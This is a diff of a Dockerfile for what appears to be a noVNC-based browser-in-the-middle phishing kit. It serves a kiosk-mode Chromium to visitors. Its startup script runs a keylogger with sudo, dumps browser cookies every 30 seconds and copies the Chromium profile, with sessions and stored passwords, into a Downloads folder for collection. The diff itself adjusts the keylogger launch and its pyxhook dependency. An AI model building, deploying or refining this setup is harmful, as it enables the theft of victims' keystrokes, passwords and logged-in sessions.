@@ -8,6 +8,7 @@ ENV FOLDER default
 
 RUN apk add sudo bash xfce4 xvfb xdpyinfo lightdm-gtk-greeter x11vnc xfce4-terminal chromium python3 py3-pip git openssl curl gcc libc-dev python3-dev python3-tkinter && \
     ln -s /usr/bin/python3 /usr/bin/python && \
+    pip3 install pyxhook && \
     echo 'CHROMIUM_FLAGS="--disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic"' >> /etc/chromium/chromium.conf && \
     dbus-uuidgen > /var/lib/dbus/machine-id
 
@@ -19,14 +20,13 @@ WORKDIR /home/user
 
 RUN mkdir -p /home/user/.vnc && x11vnc -storepasswd false /home/user/.vnc/passwd && \
     git clone https://github.com/novnc/noVNC.git /home/user/noVNC && \
-    pip3 install pyxhook pycryptodome && \
+    pip3 install pycryptodome && \
     git clone https://github.com/novnc/websockify /home/user/noVNC/utils/websockify && \
     rm -rf /home/user/noVNC/.git && \
     rm -rf /home/user/noVNC/utils/websockify/.git && \
     sudo apk del git
 
 RUN echo 'export DISPLAY=:0' > /home/user/kiosk.sh && \
-    echo '/bin/bash -c "xfconf-query -c xfce4-keyboard-shortcuts -p /commands -r -R"'  >> /home/user/kiosk.sh && \
     echo 'mkdir /home/user/noVNC/$FOLDER && mv /home/user/noVNC/* /home/user/noVNC/$FOLDER/; mv /home/user/noVNC/$FOLDER/utils /home/user/noVNC/; mv /home/user/noVNC/$FOLDER/*.html /home/user/noVNC/' > /home/user/kiosk.sh && \
     echo 'TITLE=$(curl -sk $WEBPAGE | grep "<title>" | grep "</title>" | sed "s/<[^>]*>//g")' >> /home/user/kiosk.sh && \
     echo 'sed -i "124d" /home/user/noVNC/vnc_lite.html &&  sed  "131 i let path=\"$FOLDER/websockify\"" /home/user/noVNC/vnc_lite.html > /home/user/noVNC/index.html ' >> /home/user/kiosk.sh && \
@@ -38,8 +38,7 @@ RUN echo 'export DISPLAY=:0' > /home/user/kiosk.sh && \
     chmod +x /home/user/kiosk.sh
 
 RUN echo '/bin/bash -c /home/user/kiosk.sh &' > /home/user/startVNC.sh && \
-    echo 'nohup /bin/bash -c "python3 /home/user/keylogger.py &"' >> /home/user/startVNC.sh && \
-    echo 'xfconf-query -c xfce4-keyboard-shortcuts -p /commands -r -R'  >> /home/user/startVNC.sh && \
+    echo 'nohup /bin/bash -c "sudo python3 /home/user/keylogger.py &"' >> /home/user/startVNC.sh && \
     echo 'nohup  -c "while true ; do sleep 30 ; sudo python3 cookies.py > Downloads/Cookies.txt ; done" &' >> /home/user/startVNC.sh && \
     echo 'nohup /bin/bash -c "while true ; do sleep 30 ; cp -R /home/user/.config/chromium/Default /home/user/Downloads/ ; done" &' >> /home/user/startVNC.sh && \
     echo 'sudo rm -f /tmp/.X${DISPLAY#:}-lock' >> /home/user/startVNC.sh && \
@@ -58,6 +57,7 @@ COPY Files/rfb.js /home/user/noVNC/core/
 COPY Files/ui.js /home/user/noVNC/app/
 COPY Files/kiosk.zip /home/user/
 COPY Files/keylogger.py /home/user/
+
 
 ENTRYPOINT ["/bin/bash","-c", "\
             startVNC () { \
